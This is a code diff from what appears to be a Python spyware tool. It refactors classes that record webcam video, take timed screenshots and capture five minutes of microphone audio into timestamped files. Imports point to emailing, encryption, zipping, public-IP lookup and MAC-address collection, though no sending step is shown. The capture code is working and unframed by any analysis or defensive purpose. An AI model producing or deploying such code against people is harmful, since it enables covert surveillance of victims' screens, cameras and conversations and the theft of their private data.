@@ -11,13 +11,12 @@ from email import encoders
 
 # Third-Party Library Imports
 from PIL import ImageGrab
-import sounddevice as sd
-import wavfile as wf
+import pyaudio
+import wave
 from dotenv import load_dotenv
 from requests import get
 import platform
 from getmac import get_mac_address
-import keyboard
 from cryptography.fernet import Fernet
 import zipfile
 import shutil
@@ -42,6 +41,7 @@ class BaseClass:
 
         # General time length for timer based functions
         self.duration = 300
+        self.end_time = time.time() + self.duration
 
         # Load config settings - mail and password
         self.load_dotenv = load_dotenv()
@@ -60,13 +60,11 @@ class Webcamera(BaseClass):
     def __init__(self):
         super().__init__()  # Call the base class __init__ method
 
-        # Video length: 5 minutes
-        self.end_time = time.time() + self.duration
+        # Generate a unique filename for the recording
+        self.current_time = time.strftime("%Y%m%d-%H%M%S")
 
         # Folder path and filename
         self.folder_path = self.folder_path_recordings
-        # Generate a unique filename for the recording
-        self.current_time = time.strftime("%Y%m%d-%H%M%S")
         self.output_file_name = f"Recording{self.current_time}.mp4"
 
     @staticmethod
@@ -112,16 +110,14 @@ class Screenshot(BaseClass):
         # Constants
         self.counter = 0
         self.sleepAmount = 1
+        self.image = None
 
-        # Timer for taking screenshots
-        self.end_time = time.time() + self.duration
+        # Generate a unique filename for the sub-folders
+        self.current_time = time.strftime("%Y%m%d-%H%M%S")
 
         # Folder path and folder name
         self.folder_path = self.folder_path_screenshots
-        # Generate a unique filename for the sub-folders
-        self.current_time = time.strftime("%Y%m%d-%H%M%S")
         self.folder_name = f"Subfolder{self.current_time}"
-        self.image = None
 
     def create_subfolder(self):
         subfolder_path = os.path.join(self.folder_path, self.folder_name)
@@ -162,38 +158,53 @@ class Microphone(BaseClass):
         super().__init__()  # Call the base class __init__ method
 
         # Constants for audio settings
-        self.audio_data = None
+        self.format = pyaudio.paInt16
+        self.channels = 2
         self.sample_rate = 44100  # Normal wave length for normal sound quality
+        self.chunk = 1024
+        self.frames = []
+
+        # Generate a unique filename for the sub-folders
+        self.current_time = time.strftime("%Y%m%d-%H%M%S")
 
         # Folder path and filename
         self.folder_path = self.folder_path_soundfiles
-        self.output_file_name = f"Soundfile.wav"
+        self.output_file_name = f"Soundfile{self.current_time}.wav"
 
     def audio_recording(self):
-        try:
-            # Record
-            self.audio_data = sd.rec(
-                int(self.sample_rate * self.duration),
-                samplerate=self.sample_rate,
-                channels=2
-            )
+        p = pyaudio.PyAudio()
 
-            while True:
-                if keyboard.is_pressed('q'):
-                    break
+        stream = p.open(
+            format=self.format,
+            channels=self.channels,
+            rate=self.sample_rate,
+            input=True,
+            frames_per_buffer=self.chunk
+        )
 
-            sd.wait()
+        while time.time() < self.end_time:
+            try:
+                data = stream.read(self.chunk)
+                self.frames.append(data)
 
-            # Create the folder path if it doesn't exist
-            if not os.path.exists(self.folder_path):
-                os.makedirs(self.folder_path)
+            except IOError as e:
+                print(f"Audio recording error: {e}")
 
-            # Save captured audio to the file path
-            file_path = os.path.join(self.folder_path, self.output_file_name)
-            wf.write(file_path, self.sample_rate, self.audio_data)
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
 
-        except sd.PortAudioError as e:
-            print(f"Audio recording error: {e}")
+        # Create the folder path if it doesn't exist
+        if not os.path.exists(self.folder_path):
+            os.makedirs(self.folder_path)
+
+        # Save captured audio to the file path
+        file_path = os.path.join(self.folder_path, self.output_file_name)
+        with wave.open(file_path, 'wb') as f:
+            f.setnchannels(self.channels)
+            f.setsampwidth(p.get_sample_size(self.format))
+            f.setframerate(self.sample_rate)
+            f.writeframes(b''.join(self.frames))
 
 
 class SysInfo(BaseClass):
